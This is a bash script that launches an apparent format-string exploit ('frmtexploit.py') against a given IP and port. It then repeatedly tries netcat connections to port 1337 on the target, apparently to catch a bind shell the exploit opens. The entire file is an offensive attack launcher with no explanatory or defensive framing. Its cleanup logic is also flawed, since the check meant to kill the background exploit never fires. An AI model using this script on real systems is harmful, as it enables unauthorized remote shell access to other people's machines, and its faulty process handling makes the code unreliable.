#!/bin/bash

# How many times to spam netcat
ATTEMPTS=15

if [ $# -ne 2 ]; then
    echo "Usage: exploit [target ip] [target port]"
    exit 0
fi

IP=$1
PORT=$2

# launch exploit, acquire its PID
# to kill it later because infinite loops
echo "launching exploit"
./frmtexploit.py $IP $PORT & PID=$!

# loop and spam netcat X times
NCCOUNT=0
while [ $NCCOUNT -lt $ATTEMPTS ]; do
    NCCOUNT=$[$NCCOUNT+1]
    printf "trying nc %02i\r\r" $NCCOUNT
    nc $IP 1337
	
	# determine if NC was closed by user or if failed to connect
    NCSTAT=$?
    sleep 1
	
	# NC was closed by user, cleanly exit
    if [ $NCSTAT -eq 0 ]; then
	echo "exiting"
	
	# check if exploit is still listening, kill it if so
	if [ -z ${PID+x} ]; then
	    kill $PID
	fi
	exit 0
    fi
done

# if we're at this point, then exploit didn't do its job
echo "exploit failed"

if [ -z ${PID+x} ]; then
    kill $PID
fi

